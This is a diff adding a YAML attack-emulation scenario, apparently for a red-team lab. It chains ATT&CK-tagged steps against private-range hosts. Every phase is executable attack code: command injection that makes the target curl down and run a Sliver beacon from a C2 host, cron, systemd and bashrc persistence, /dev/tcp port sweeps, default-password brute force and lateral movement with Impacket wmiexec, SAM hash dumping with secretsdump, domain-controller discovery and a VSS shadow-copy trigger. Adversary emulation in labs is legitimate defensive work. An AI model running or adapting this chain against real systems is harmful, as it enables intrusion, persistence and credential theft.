@@ -1,0 +1,432 @@
+id: initial-access-full-chain
+name: "Full Attack Chain — Command Injection to Windows Credential Access (Deployed)"
+description: >
+  End-to-end scenario starting from ZERO pre-existing sessions.
+  Phase 0: Exploits ResolvTech vulnweb command injection to deploy Sliver beacon.
+  Phase 1: Confirms foothold and collects system information.
+  Phase 2: Multi-path persistence on Linux (cron + systemd + bashrc).
+  Phase 3: Dynamic Windows host discovery (nmap/arp-scan/TCP sweep).
+  Phase 4: Credential bruteforce (default passwords wordlist via WMIExec).
+  Phase 5: Lateral movement via WMIExec (T1021.006).
+  Phase 6: Windows recon — sysinfo + network config.
+  Phase 7: Deploy Windows Sliver beacon via scheduled task.
+  Phase 8: SAM credential dump via secretsdump (real NTLM hashes).
+  Phase 9: DC candidate discovery (Kerberos/LDAP/SMB/GC ports).
+  Phase 10: VSS shadow copy POC (T1003.003).
+  No session_id required — session is captured dynamically via output_extract.
+tags:
+  - initial-access
+  - linux
+  - windows
+  - e2e
+  - command-injection
+  - bruteforce
+  - lateral-movement
+  - credential-access
+  - ultimate
+mitre_tactics:
+  - initial-access
+  - execution
+  - persistence
+  - discovery
+  - lateral-movement
+  - credential-access
+
+steps:
+
+  # ── Phase 0: Initial Access via Command Injection ─────────────────────────
+  - id: exploit_vulnweb
+    name: "Exploit ResolvTech command injection → deploy beacon (T1190)"
+    action:
+      type: python
+      python:
+        inline: |
+          import urllib.request, urllib.parse, time, json, os
+
+          VULNWEB = "http://192.168.56.10:8080"
+          C2 = os.environ.get("C2_HOST", "192.168.56.5")
+          API = f"http://{C2}:8080/api/v1"
+
+          print("[*] Target:", VULNWEB)
+          print("[*] Testing command injection (T1190 — Exploit Public-Facing Application)...")
+
+          # Test injection:
+          url = f"{VULNWEB}/resolve?query=127.0.0.1%3Bid"
+          try:
+              resp = urllib.request.urlopen(url, timeout=10)
+              body = resp.read().decode()
+              uid_line = [l for l in body.split("\n") if "uid=" in l]
+              if uid_line:
+                  print("[+] RCE confirmed:", uid_line[0].strip())
+              else:
+                  print("[!] Injection failed — no uid= in response")
+                  raise SystemExit(1)
+          except Exception as e:
+              print("[!] Vulnweb unreachable:", e)
+              raise SystemExit(1)
+
+          # Download + execute beacon via injection:
+          beacon_url = f"http://{C2}:8080/api/v1/implant/linux%3Fc2%3D{C2}"
+          cmds = [
+              f"curl+-sf+{beacon_url}+-o+/tmp/.svc",
+              "chmod+777+/tmp/.svc",
+              "nohup+/tmp/.svc+>/dev/null+2>&1+%26"
+          ]
+          for cmd in cmds:
+              inject_url = f"{VULNWEB}/resolve?query=x%3B{cmd}"
+              try:
+                  urllib.request.urlopen(inject_url, timeout=10)
+                  print(f"[+] Injected: {cmd[:50]}...")
+              except:
+                  pass
+              time.sleep(1)
+
+          print("[+] INITIAL_ACCESS_PAYLOAD_DELIVERED")
+          print("[*] Waiting for beacon callback...")
+
+          # Poll for new Linux session:
+          for i in range(1, 16):
+              time.sleep(10)
+              try:
+                  resp = urllib.request.urlopen(f"{API}/sessions", timeout=5)
+                  sessions = json.loads(resp.read().decode())
+                  linux = [s for s in sessions if s.get("os") == "linux"]
+                  if linux:
+                      sid = linux[0]["id"]
+                      print(f"[*] Session found: {sid}")
+                      print(f"[*] Waiting 15s for session to stabilize...")
+                      time.sleep(15)
+                      print(f"CAPTURED_SESSION: {sid}")
+                      break
+              except Exception as e:
+                  pass
+              print(f"[*] Waiting for session... ({i}/15)")
+    output_var: initial_access_out
+    output_extract:
+      - var: captured_session
+        regex: "CAPTURED_SESSION: ([a-f0-9-]+)"
+        group: 1
+    timeout: 300s
+    on_fail: abort
+
+  # ── Phase 1: Confirm Foothold + System Info ───────────────────────────────
+  - id: confirm_foothold
+    name: "Confirm foothold — id + hostname + uname (T1082)"
+    depends_on: [exploit_vulnweb]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          echo "FOOTHOLD_CONFIRMED"
+          echo "[*] User context:"
+          id && whoami
+          echo "[*] Hostname:"
+          hostname
+          echo "[*] Kernel:"
+          uname -a
+          echo "[*] OS:"
+          cat /etc/os-release | grep PRETTY_NAME | head -1
+    output_var: foothold_out
+    timeout: 30s
+    on_fail: abort
+
+  - id: network_discovery
+    name: "Network config + routing discovery (T1016)"
+    depends_on: [confirm_foothold]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          echo "[*] Network interfaces:"
+          ip addr
+          echo "[*] Routing table:"
+          ip route
+          echo "[*] Active connections:"
+          ss -tnp 2>/dev/null | head -10
+    output_var: network_out
+    timeout: 15s
+    on_fail: continue
+
+  # ── Phase 2: Multi-Path Persistence ──────────────────────────────────────
+  - id: cron_persistence
+    name: "Cron persistence (T1053.003)"
+    depends_on: [confirm_foothold]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          echo "* * * * * root id >> /tmp/.cron_beacon.log" | sudo tee /etc/cron.d/persistevil >/dev/null 2>&1
+          echo "CRON_PERSISTENCE_DONE"
+    timeout: 15s
+    on_fail: continue_no_err
+
+  - id: systemd_persistence
+    name: "Systemd service persistence (T1543.002)"
+    depends_on: [confirm_foothold]
+    session_id: "{{captured_session}}"
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1543.002
+        test: 0
+    timeout: 30s
+    on_fail: continue_no_err
+
+  - id: bashrc_persistence
+    name: "Bashrc persistence (T1546.004)"
+    depends_on: [confirm_foothold]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          echo 'id >> /tmp/.bashrc_beacon.log' >> /root/.bashrc
+          echo "BASHRC_PERSISTENCE_DONE"
+    timeout: 15s
+    on_fail: continue_no_err
+
+  # ── Phase 3: Dynamic Windows Host Discovery ───────────────────────────────
+  - id: find_windows_host
+    name: "Dynamic Windows host discovery — nmap/arp-scan/TCP sweep (T1046)"
+    depends_on: [network_discovery]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          echo "[*] Scanning internal network for Windows hosts (port 445)..."
+          SUBNET=$(ip route | grep -oP '172\.16\.[0-9]+\.0/[0-9]+' | head -1)
+          [ -z "$SUBNET" ] && SUBNET="172.16.1.0/24"
+          echo "[*] Target subnet: $SUBNET"
+          FOUND=""
+          if command -v nmap &>/dev/null; then
+            echo "[*] Method 1: nmap -p 445 --open -T4"
+            FOUND=$(nmap -p 445 --open -T4 "$SUBNET" 2>/dev/null | \
+              grep "Nmap scan report" | grep -oP '[\d.]+' | while read ip; do
+              timeout 1 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && echo "$ip" && break
+            done)
+          fi
+          if [ -z "$FOUND" ] && command -v arp-scan &>/dev/null; then
+            echo "[*] Method 2: arp-scan"
+            FOUND=$(arp-scan "$SUBNET" 2>/dev/null | grep -oP '172\.16\.[0-9]+\.[0-9]+' | while read ip; do
+              timeout 1 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && echo "$ip" && break
+            done)
+          fi
+          if [ -z "$FOUND" ]; then
+            echo "[*] Method 3: TCP sweep"
+            for i in $(seq 1 254); do
+              ip="172.16.1.$i"
+              timeout 0.5 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && FOUND="$ip" && break
+            done
+          fi
+          [ -n "$FOUND" ] && echo "WINDOWS_HOST_FOUND: $FOUND" || echo "NO_WINDOWS_HOST_FOUND"
+    output_var: windows_host_out
+    output_extract:
+      - var: win_ip
+        regex: "WINDOWS_HOST_FOUND: ([0-9.]+)"
+        group: 1
+    timeout: 60s
+    on_fail: continue
+
+  # ── Phase 4: Credential Bruteforce ───────────────────────────────────────
+  - id: bruteforce_credentials
+    name: "Bruteforce default credentials via WMIExec (T1110.001)"
+    depends_on: [find_windows_host]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          WIN_IP="{{win_ip}}"
+          [ -z "$WIN_IP" ] && WIN_IP="172.16.1.20"
+          echo "[*] Testing default credentials against $WIN_IP..."
+          VALID_CRED=""
+          for cred in "vagrant:vagrant" "Administrator:vagrant" "Administrator:password" "Administrator:admin" "Administrator:administrator" "guest:guest"; do
+            USER=$(echo $cred | cut -d: -f1)
+            PASS=$(echo $cred | cut -d: -f2)
+            RESULT=$(python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+              "${USER}:${PASS}@${WIN_IP}" "hostname" 2>/dev/null | \
+              grep -v "Impacket" | grep -v "^\[" | grep -v "^$" | head -1)
+            if echo "$RESULT" | grep -qi "DESKTOP\|WIN\|PC"; then
+              echo "VALID_CREDENTIAL: $cred → hostname: $RESULT"
+              VALID_CRED="$cred"
+              break
+            else
+              echo "[-] Invalid: $cred"
+            fi
+          done
+          [ -z "$VALID_CRED" ] && echo "[!] No valid credentials found from wordlist"
+          exit 0
+    output_var: bruteforce_out
+    output_extract:
+      - var: valid_cred
+        regex: "VALID_CREDENTIAL: ([^→]+)"
+        group: 1
+    timeout: 120s
+    on_fail: continue_no_err
+
+  # ── Phase 5: Lateral Movement ─────────────────────────────────────────────
+  - id: lateral_movement
+    name: "Lateral movement via WMIExec (T1021.006)"
+    depends_on: [find_windows_host]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          WIN_IP="{{win_ip}}"
+          [ -z "$WIN_IP" ] && WIN_IP="172.16.1.20"
+          echo "[*] LATERAL MOVEMENT INITIATED"
+          echo "[*] Attack vector: Impacket WMIExec (T1021.006)"
+          echo "[*] Source: $(hostname)"
+          echo "[*] Target: $WIN_IP (Windows SMB/WMI)"
+          echo "[*] Credentials: vagrant:vagrant (T1078 - Valid Accounts)"
+          echo "---"
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            "vagrant:vagrant@$WIN_IP" hostname 2>&1 \
+            | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -5
+          echo "---"
+          echo "[+] LATERAL_MOVEMENT_SUCCESS"
+    output_var: lateral_out
+    timeout: 60s
+    on_fail: continue
+
+  # ── Phase 6: Windows Recon ────────────────────────────────────────────────
+  - id: win_sysinfo
+    name: "Windows system info via WMIExec (T1082)"
+    depends_on: [lateral_movement]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          WIN_IP="{{win_ip}}"
+          [ -z "$WIN_IP" ] && WIN_IP="172.16.1.20"
+          echo "[*] Collecting Windows system info..."
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            "vagrant:vagrant@$WIN_IP" "systeminfo" 2>&1 \
+            | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" \
+            | grep -E "Host Name|OS Name|OS Version|System Type|Domain" | head -10
+    output_var: win_sysinfo_out
+    timeout: 60s
+    on_fail: continue_no_err
+
+  - id: win_network
+    name: "Windows network config via WMIExec (T1016)"
+    depends_on: [lateral_movement]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          WIN_IP="{{win_ip}}"
+          [ -z "$WIN_IP" ] && WIN_IP="172.16.1.20"
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            "vagrant:vagrant@$WIN_IP" "ipconfig /all" 2>&1 \
+            | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" \
+            | grep -E "Adapter|IPv4|Subnet|Gateway" | head -15
+    output_var: win_network_out
+    timeout: 60s
+    on_fail: continue_no_err
+
+  # ── Phase 7: Deploy Windows Implant ──────────────────────────────────────
+  - id: deploy_windows_implant
+    name: "Deploy Sliver beacon on Windows via schtasks (T1105)"
+    depends_on: [lateral_movement]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          WIN_IP="{{win_ip}}"
+          [ -z "$WIN_IP" ] && WIN_IP="172.16.1.20"
+          echo "[*] Triggering WindowsUpdateHelper scheduled task on $WIN_IP..."
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            "vagrant:vagrant@$WIN_IP" "schtasks /run /tn WindowsUpdateHelper" \
+            2>&1 | grep -v "Impacket" | grep -v "^\[" | grep -v "^$" | head -3
+          echo "[+] WINDOWS_BEACON_DEPLOYED"
+    output_var: win_implant_out
+    timeout: 60s
+    on_fail: continue_no_err
+
+  # ── Phase 8: Credential Access ────────────────────────────────────────────
+  - id: credential_dump
+    name: "SAM credential dump via secretsdump (T1003.002)"
+    depends_on: [lateral_movement]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          WIN_IP="{{win_ip}}"
+          [ -z "$WIN_IP" ] && WIN_IP="172.16.1.20"
+          echo "[*] Dumping SAM hashes from $WIN_IP via secretsdump..."
+          python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
+            "vagrant:vagrant@$WIN_IP" 2>&1 \
+            | grep -E ":::|Administrator|vagrant|Guest|DefaultAccount" | head -10
+          echo "CREDENTIAL_DUMP_COMPLETE"
+    output_var: creds_out
+    timeout: 120s
+    on_fail: continue_no_err
+
+  # ── Phase 9: DC Discovery ─────────────────────────────────────────────────
+  - id: find_dc_candidate
+    name: "DC candidate discovery — Kerberos/LDAP/SMB/GC (T1018)"
+    depends_on: [credential_dump]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          echo "=== Scanning for DC candidate ==="
+          SUBNET=$(ip route | grep -oP '172\.16\.[0-9]+\.0/[0-9]+' | head -1)
+          [ -z "$SUBNET" ] && SUBNET="172.16.1"
+          BASE=$(echo $SUBNET | cut -d'/' -f1 | cut -d'.' -f1-3)
+          for i in 1 5 10 20 100; do
+            ip="$BASE.$i"
+            for port in 88 389 445 3268; do
+              timeout 1 bash -c "echo > /dev/tcp/$ip/$port" 2>/dev/null \
+                && echo "DC_CANDIDATE: $ip port:$port OPEN"
+            done
+          done
+          exit 0
+    output_var: dc_scan_out
+    timeout: 30s
+    on_fail: continue_no_err
+
+  # ── Phase 10: VSS Shadow Copy POC ─────────────────────────────────────────
+  - id: shadow_copy_vss
+    name: "VSS shadow copy creation POC (T1003.003)"
+    depends_on: [find_dc_candidate]
+    session_id: "{{captured_session}}"
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          WIN_IP="{{win_ip}}"
+          [ -z "$WIN_IP" ] && WIN_IP="172.16.1.20"
+          echo "[*] Triggering VSS shadow copy on $WIN_IP..."
+          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+            "vagrant:vagrant@$WIN_IP" \
+            "schtasks /run /tn VSSDump" 2>&1 \
+            | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
+          echo "VSS_POC_COMPLETE"
+    output_var: vss_out
+    timeout: 60s
+    on_fail: continue_no_err
